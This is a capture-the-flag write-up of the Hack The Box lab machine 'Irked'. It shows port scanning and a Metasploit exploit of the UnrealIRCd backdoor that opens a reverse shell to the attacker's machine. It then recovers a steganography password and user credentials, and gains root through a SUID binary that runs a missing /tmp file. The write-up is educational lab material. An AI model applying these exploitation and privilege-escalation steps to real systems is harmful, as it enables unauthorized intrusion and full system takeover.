---
layout: post
category: writeup
---

## Machine Info

- Name: Irked
- Description: Irked is a pretty simple and straight-forward box which requires basic enumeration skills. It shows the need to scan all ports on machines and to investigate any out of the place binaries found while enumerating a system.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesnt have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46182/tcp6  status
|   100024  1          57619/udp6  status
|   100024  1          57900/tcp   status
|_  100024  1          60579/udp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
57900/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UnrealIRCd is vulnerable to RCE, using Metasploit I should be able to get a shell relatively quickly:

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Command shell session 1 opened (10.10.14.14:4444 -> 10.10.10.117:47154) at 2024-01-19 18:01:56 -0500

whoami
ircd
```

## Privilege Escalation

Doing some intial enum didn't find anything so I went to the home directory of the other user and looked for interesting files:
```bash
ircd@irked:/home/djmardov$ find . 
find . 
.
./.dbus
find: `./.dbus': Permission denied
./.profile
./.bash_history
./.ssh
find: `./.ssh': Permission denied
./Downloads
./Documents
./Documents/user.txt
./Documents/.backup
./.gnupg
find: `./.gnupg': Permission denied
./Desktop
./.cache
find: `./.cache': Permission denied
./.gconf
find: `./.gconf': Permission denied
./.local
find: `./.local': Permission denied
./.ICEauthority
./Music
./Public
./.config
find: `./.config': Permission denied
./.bash_logout
./.bashrc
./user.txt
./Videos
./Pictures
./Templates
./.mozilla
find: `./.mozilla': Permission denied
```

I can see here there is a .backup file in Documents, let's read it:
```bash
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

This is interesting, it says it is a steg pw, let me check if I saw an image somewhere:

![](assets/images/2024-01-19-irked-writeup-image-1.png)

On the webpage! Let's download this image and extract whatever data is in there:

```bash
HTB steghide extract -sf irked.jpg 
Enter passphrase: 
wrote extracted data to "pass.txt".
➜  HTB cat pass.txt 
Kab6h+m+bbp2J:HG
```

Now I can su into djmardov:
```bash
ircd@irked:/home/djmardov/Documents$ su djmardov
su djmardov
Password: Kab6h+m+bbp2J:HG
```

I check the suid binary and I see some odd behavior:

```bash
djmardov@irked:/var$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
djmardov@irked:/var$ ls -la /usr/bin/viewuser
ls -la /usr/bin/viewuser
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
djmardov@irked:/var$ /usr/bin/viewuser
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-01-19 17:59 (:0)
sh: 1: /tmp/listusers: not found
djmardov@irked:/var$ cd /tmp/     
cd /tmp/
djmardov@irked:/tmp$ cp /bin/sh /tmp/listusers
cp /bin/sh /tmp/listusers
djmardov@irked:/tmp$ /usr/bin/viewuser
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-01-19 17:59 (:0)
# whoami
root
```

It runs a command called /tmp/listusers but it doesn't exist, so if I copy /bin/sh and execute I should be root!

## Beyond Root

the intial access was CTFy however its realistic, vulnerable IRC with good passwords, just the steg was dumb. Update IRC and change passwords.

For priv esc I went down a few rabbit holes because I didn't recognize /usr/bin/viewuser as standing out. If I took a closer look sooner I woulda had it. 

best,
gerbsec